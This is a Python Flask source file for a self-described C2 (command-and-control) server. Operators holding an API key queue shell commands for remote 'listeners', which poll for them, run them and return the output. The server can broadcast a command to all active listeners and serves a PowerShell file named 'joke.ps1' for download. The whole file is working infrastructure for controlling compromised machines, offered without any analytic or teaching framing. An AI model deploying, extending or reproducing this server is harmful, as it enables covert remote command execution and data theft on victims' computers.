from flask import Flask, request, jsonify
from datetime import datetime, timedelta
from functools import wraps
import secrets
import logging
from flask import send_file
from collections import defaultdict

app = Flask(__name__)

API_KEY = "SECRET_API_KEY"
LISTENER_SECRET = "SECRET_LISTENER_TOKEN"
MAX_COMMAND_QUEUE = 100

listener_queues = defaultdict(list)
listener_last_seen = {}
command_results = {}

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)

def get_client_ip():

    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def require_api_key(f):
    @wraps(f)
    def decorated(*args, **kwargs):

        auth = request.headers.get('Authorization')

        if not auth or not auth.startswith('Bearer '):
            return jsonify({"error": "Missing API key"}), 401
        token = auth.replace('Bearer ', '')

        if not secrets.compare_digest(token, API_KEY):
            return jsonify({"error": "Invalid API key"}), 403
        return f(*args, **kwargs)
    return decorated

def require_listener_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):

        auth = request.headers.get('Authorization')

        if not auth or not auth.startswith('Bearer '):
            return jsonify({"error": "Missing auth"}), 401
        token = auth.replace('Bearer ', '')

        if not secrets.compare_digest(token, LISTENER_SECRET):
            return jsonify({"error": "Invalid auth"}), 403
        return f(*args, **kwargs)
    return decorated

@app.route("/api/command", methods=["POST"])
@require_api_key
def send_command():
    try:
        data = request.json or {}
        command = data.get("command", "").strip()
        listener_id = data.get("listener_id", "all")

        if not command:
            return jsonify({"error": "Command cannot be empty"}), 400

        if listener_id == "all":
            total_queued = sum(len(q) for q in listener_queues.values())

        else:
            total_queued = len(listener_queues.get(listener_id, []))

        if total_queued >= MAX_COMMAND_QUEUE:
            return jsonify({"error": "Queue full"}), 429

        command_obj = {
            "id": secrets.token_urlsafe(16),
            "command": command,
            "timestamp": datetime.utcnow().isoformat(),
            "sender_ip": get_client_ip()
        }

        if listener_id == "all":

            active_count = 0
            now = datetime.utcnow()

            for lid in list(listener_last_seen.keys()):
                if now - listener_last_seen[lid] < timedelta(minutes=5):
                    listener_queues[lid].append(command_obj.copy())
                    active_count += 1

            logger.info(f"Broadcast '{command}' to {active_count} listeners")

            return jsonify({
                "status": "ok",
                "command_id": command_obj["id"],
                "broadcasted_to": active_count
            })

        else:
            listener_queues[listener_id].append(command_obj)
            logger.info(f"Queued '{command}' for {listener_id}")
            return jsonify({
                "status": "ok",
                "command_id": command_obj["id"],
                "listener_id": listener_id
            })

    except Exception as e:

        logger.error(f"send_command error: {e}")
        return jsonify({"error": "Internal error"}), 500

@app.route("/api/poll", methods=["POST"])
@require_listener_auth
def poll_commands():
    try:
        data = request.json or {}
        listener_id = data.get("listener_id")

        if not listener_id:
            return jsonify({"error": "listener_id required"}), 400
        listener_last_seen[listener_id] = datetime.utcnow()

        if listener_id not in listener_queues:
            listener_queues[listener_id] = []
            logger.info(f"New listener: {listener_id}")

        if listener_queues[listener_id]:
            cmd = listener_queues[listener_id].pop(0)
            logger.info(f"Delivered to {listener_id}: {cmd['command']}")
            return jsonify({
                "command": cmd["command"],
                "command_id": cmd["id"],
                "timestamp": cmd["timestamp"]
            })

        else:
            return jsonify({"command": None})

    except Exception as e:
        logger.error(f"poll error: {e}")
        return jsonify({"error": "Internal error"}), 500

@app.route("/api/result", methods=["POST"])
@require_listener_auth
def submit_result():
    try:
        data = request.json or {}
        listener_id = data.get("listener_id")
        command_id = data.get("command_id")
        result = data.get("result", "")
        status = data.get("status", "unknown")
        return_code = data.get("return_code", -1)

        command_results[command_id] = {
            "listener_id": listener_id,
            "command_id": command_id,
            "result": result,
            "status": status,
            "return_code": return_code,
            "timestamp": datetime.utcnow().isoformat()
        }

        logger.info(f"Result from {listener_id} for {command_id}: {status}")
        return jsonify({"status": "ok"})

    except Exception as e:
        logger.error(f"result error: {e}")
        return jsonify({"error": "Internal error"}), 500

@app.route("/api/result/<command_id>", methods=["GET"])
@require_api_key
def get_result(command_id):
    result = command_results.get(command_id)
    if result:
        return jsonify(result)
    return jsonify({"error": "Not found"}), 404

@app.route("/api/listeners", methods=["GET"])
@require_api_key
def list_listeners():
    now = datetime.utcnow()
    active = []

    for lid, last in listener_last_seen.items():
        diff = now - last
        active.append({
            "listener_id": lid,
            "last_seen": last.isoformat(),
            "seconds_ago": int(diff.total_seconds()),
            "active": diff < timedelta(minutes=1),
            "pending": len(listener_queues.get(lid, []))
        })

    return jsonify({"listeners": active, "total": len(active)})

@app.route('/joke.ps1')
def serve_joke():
    return send_file('joke.ps1')

@app.route("/api/health", methods=["GET"])
def health_check():
    return jsonify({"status": "ok", "timestamp": datetime.utcnow().isoformat()})

@app.errorhandler(404)
def not_found(e):
    return jsonify({"error": "Not found"}), 404

@app.errorhandler(500)
def internal_error(e):
    return jsonify({"error": "Internal error"}), 500

if __name__ == "__main__":
    print("C2 server running on port 6969")
    app.run(host="0.0.0.0", port=6969, debug=False, threaded=True)